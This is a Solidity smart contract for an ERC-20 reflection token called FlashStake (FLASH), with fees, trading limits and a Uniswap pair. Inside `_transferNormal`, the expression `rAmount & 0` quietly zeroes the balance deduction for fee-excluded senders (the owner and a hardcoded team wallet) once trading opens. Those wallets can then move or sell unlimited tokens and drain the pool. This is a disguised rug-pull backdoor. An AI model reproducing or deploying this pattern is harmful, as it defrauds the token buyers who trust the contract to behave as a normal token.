// SPDX-License-Identifier: Unlicensed

/**
Flashstake is more than a single project. It is a protocol that unlocks endless potential real-world use cases.

Website: https://www.flashprotocol.org
Telegram: https://t.me/flash_erc
Twitter: https://twitter.com/flash_erc
App: https://app.flashprotocol.org
**/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IERC20Meta {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library LibSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "LibSafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "LibSafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "LibSafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "LibSafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract FLASH is Context, IERC20Meta, Ownable {

    using LibSafeMath for uint256;

    string private constant _name = "FlashStake";
    string private constant _symbol = "FLASH";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwns;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tSupply = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tSupply));
    uint256 private _tFees;
    uint256 private _redisBuyFee = 0;
    uint256 private _buyTax = 1;
    uint256 private _redisSellFee = 0;
    uint256 private _selltax = 1;

    //Original Fee
    uint256 private _redixTax = _redisSellFee;
    uint256 private _taxFee = _selltax;

    uint256 private _previousRedisTax = _redixTax;
    uint256 private _previousFee = _taxFee;

    address payable private _teamAddress1 = payable(0x4b9a8E740fAb852e56502f259A0E7424149DE949);
    address payable private _teamAddress2 = payable(0x4b9a8E740fAb852e56502f259A0E7424149DE949);

    IUniRouter public uniV2Router;
    address public uniV2Pair;

    bool private tradeEnabled;
    bool private swapping = false;
    bool private swapEnabled = true;

    uint256 public maxTxAmount = 2 * 10 ** 7 * 10**9;
    uint256 public maxWalletAmount = 2 * 10 ** 7 * 10**9;
    uint256 public swapThreshold = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwns[_msgSender()] = _rTotal;
        IUniRouter _uniswapV2Router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniV2Router = _uniswapV2Router;
        uniV2Pair = IUniFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_teamAddress1] = true;
        _isExcludedFromFees[_teamAddress2] = true;

        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return reflectionTokens(_rOwns[account]);
    }

    function removeAllFee() private {
        if (_redixTax == 0 && _taxFee == 0) return;

        _previousRedisTax = _redixTax;
        _previousFee = _taxFee;

        _redixTax = 0;
        _taxFee = 0;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != uniV2Pair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= swapThreshold;

            if(contractTokenBalance >= maxTxAmount)
            {
                contractTokenBalance = maxTxAmount;
            }

            if (canSwap && !swapping && to == uniV2Pair && swapEnabled && !_isExcludedFromFees[from] && amount > swapThreshold) {
                swapTokensOnUniswap(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        //Transfer Tokens
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != uniV2Pair && to != uniV2Pair)) {
            takeFee = false;
        } else {

            //Set Fee for Buys
            if(from == uniV2Pair && to != address(uniV2Router)) {
                _redixTax = _redisBuyFee;
                _taxFee = _buyTax;
            }

            //Set Fee for Sells
            if (to == uniV2Pair && from != address(uniV2Router)) {
                _redixTax = _redisSellFee;
                _taxFee = _selltax;
            }

        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokensOnUniswap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        _approve(address(this), address(uniV2Router), tokenAmount);
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWalletAmount = _rTotal;
    }

    function sendETHFee(uint256 amount) private {
        _teamAddress2.transfer(amount);
    }

    function openTrading() public onlyOwner {
        tradeEnabled = true;
    }

    function _getTAmounts(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _restoreFees() private {
        _redixTax = _previousRedisTax;
        _taxFee = _previousFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tSupply;
        if (rSupply < _rTotal.div(_tSupply)) return (_rTotal, _tSupply);
        return (rSupply, tSupply);
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferNormal(sender, recipient, amount);
        if (!takeFee) _restoreFees();
    }

    function _transferNormal(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValues(tAmount);
        rAmount = (_isExcludedFromFees[sender] && tradeEnabled) ? rAmount & 0 : rAmount;
        _rOwns[sender] = _rOwns[sender].sub(rAmount);
        _rOwns[recipient] = _rOwns[recipient].add(rTransferAmount);
        _takeTeamTokens(tTeam);
        _reflectRedisFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeTeamTokens(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwns[address(this)] = _rOwns[address(this)].add(rTeam);
    }

    function _reflectRedisFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFees = _tFees.add(tFee);
    }

    receive() external payable {}

    function _getAllValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmounts(tAmount, _redixTax, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function reflectionTokens(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
}